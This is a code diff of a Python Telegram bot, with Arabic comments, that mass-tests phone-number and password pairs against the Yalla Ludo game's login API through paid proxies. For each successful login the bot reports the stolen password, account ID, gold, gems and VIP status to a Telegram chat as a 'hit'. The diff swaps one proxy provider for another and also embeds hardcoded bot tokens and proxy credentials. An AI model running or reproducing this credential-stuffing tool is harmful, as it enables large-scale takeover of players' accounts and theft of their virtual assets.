@@ -1,3 +1,7 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# © Q_b_h — Yalla Ludo Bot Control (Multi-Session Isolated & Advanced Crypto + Proxy)
+
 import base64
 import hashlib
 import hmac as hmacmod
@@ -19,23 +23,18 @@ from Crypto.Util.Padding import pad
 import telebot
 from telebot import types
 
-# === إعدادات البروكسي الديناميكي ===
-def get_proxy():
-    """
-    توليد إعدادات بروكسي جديدة لكل عملية طلب لضمان تغيير الـ IP مع كل فحص.
-    """
-    # يمكنك إضافة رقم جلسة عشوائي إذا كان مزود البروكسي يدعم ذلك عبر اسم المستخدم
-    session_id = random.randint(10000, 999999)
-    return {
-        "http": "http://vcvhcqlf-rotate:zpvymnjdeh0c@p.webshare.io:80",
-        "https": "http://vcvhcqlf-rotate:zpvymnjdeh0c@p.webshare.io:80",
-    }
-
 # === إعدادات البوت والمطور ===
-TG_TOKEN = "8208523854:AAEeI4w9VPmdKoPundR5wD3uMqmwrxj2bng"
+TG_TOKEN = "8844579780:AAF8oAN9eRfUK72kZL6e2BQJYYDj_06ZzAg"
 ADMIN_ID = 8795120325  # آيدي المطور
 
 bot = telebot.TeleBot(TG_TOKEN)
+
+# === إعدادات البروكسي الجديد ===
+PROXY_URL = "http://330d9a235026e98dbbd8:e2737c9436c5d6c0@gw.dataimpulse.com:823"
+PROXIES = {
+    "http": PROXY_URL,
+    "https": PROXY_URL
+}
 
 # === إعدادات البروتوكول والأمان المتقدمة ===
 version = '2.0'
@@ -254,8 +253,8 @@ def fetch_profile(token, user_id, login_data=None):
             'Content-Type': 'application/json; charset=utf-8',
         }
         try:
-            # استخدام بروكسي جديد لكل طلب جلب معلومات
-            r   = requests.post(srv + profile_path, data=wire, headers=hdrs, proxies=get_proxy(), timeout=10)
+            # تم إضافة البروكسي هنا
+            r   = requests.post(srv + profile_path, data=wire, headers=hdrs, timeout=10, proxies=PROXIES)
             obj = decode_resp(r.json(), hera)
             if obj.get('status') == 0:
                 data = obj.get('data') or {}
@@ -274,10 +273,12 @@ def format_hit_message(data, mobile, password, country, prof):
     area_prefix = "+966" if country == "SA" else "+964"
 
     lines = [
-        "<b>تم صيد حساب جديد</b>",
-        f"<b>رقم الهاتف :</b> <code>{area_prefix}{mobile}</code>",
-        f"<b>كلمة المرور :</b> <code>{password}</code>",
-        f"<b>الاسم :</b> {name}",
+        "🎲 <b>Yalla Ludo — HIT FOUND! (صيد جديد)</b>",
+        f"📱 <b>رقم الهاتف:</b> <code>{area_prefix}{mobile}</code>",
+        f"🔑 <b>كلمة المرور:</b> <code>{password}</code>",
+        f"🆔 <b>الايدي (ID):</b> <code>{uid}</code>",
+        f"👤 <b>الاسم:</b> {name}",
+        "──────────────────────────────"
     ]
 
     if prof:
@@ -306,12 +307,26 @@ def format_hit_message(data, mobile, password, country, prof):
         if isinstance(wp, float): wp = f'{wp*100:.1f}%'
 
         lines.extend([
-            f"<b>عدد الذهب :</b> {gold}",
-            f"<b>عدد جواهر :</b> {dia}",
-            f"<b>حالة الحساب :</b> {frz}",
+            f"💛 <b>الذهب:</b> {gold}",
+            f"💎 <b>الجواهر:</b> {dia}",
+            "──────────────────────────────",
+            f"🏆 <b>المستوى:</b> {lvl} (XP: {exp}/{mxp})",
+            f"👑 <b>VIP:</b> {vip}",
+            f"🎖 <b>المستوى الملكي:</b> {royal}",
+            f"⚡ <b>حالة الحساب:</b> {frz}",
+            "──────────────────────────────",
+            f"🖼 <b>الإطار:</b> {frame}",
+            f"🎨 <b>البيدق/التعليقة:</b> {pend}",
+            f"🏷 <b>لوحة الاسم:</b> {npl}",
+            f"⭐ <b>النجوم:</b> {stars}",
+            "──────────────────────────────",
+            f"🎮 <b>إجمالي المباريات:</b> {tot}",
+            f"📊 <b>نسبة الفوز:</b> {wp}",
+            f"🏅 <b>الرتبة الحالية:</b> {seg} (الأعلى: {segh})",
+            f"🥇 <b>الأوسمة:</b> ذهبي {mg} | فضي {ms} | برونزي {mc}"
         ])
     else:
-        lines.append("⚠️ <i>الحساب طالب تحقق</i>")
+        lines.append("⚠️ <i>تعذر جلب تفاصيل الملف الشخصي إضافياً</i>")
 
     lines.append("\nBy - @aboodriad")
     return "\n".join(lines)
@@ -629,8 +644,8 @@ def run_checker_loop(chat_id, user_id, msg_id):
             headers, wire, hera = body
 
             try:
-                # استخدام get_proxy() لتوليد بروكسي جديد لكل عملية فحص وتحقق
-                response = requests.post(api_url, data=wire, headers=headers, proxies=get_proxy(), timeout=15)
+                # تم إضافة البروكسي هنا لطلبات الفحص
+                response = requests.post(api_url, data=wire, headers=headers, timeout=15, proxies=PROXIES)
                 result = decode_resp(response.json(), hera)
             except Exception:
                 with session["stats_lock"]:
@@ -646,7 +661,7 @@ def run_checker_loop(chat_id, user_id, msg_id):
                     token = data.get('token', '')
                     uid = str(data.get('id') or data.get('showNumId') or '')
                     
-                    # جلب المعلومات الكاملة للحساب المصيد
+                    # جلب المعلومات الكاملة للحساب المصيد (باستخدام البروكسي أيضاً عبر fetch_profile)
                     prof = fetch_profile(token, uid, data)
                     hit_msg = format_hit_message(data, mobile, password, country, prof)
                     
@@ -689,5 +704,5 @@ def run_checker_loop(chat_id, user_id, msg_id):
                 pass
 
 if __name__ == "__main__":
-    print("🤖 Bot is running with isolated user sessions & dynamic rotating proxies...")
+    print("🤖 Bot is running with isolated user sessions & Proxy configured...")
     bot.infinity_polling()
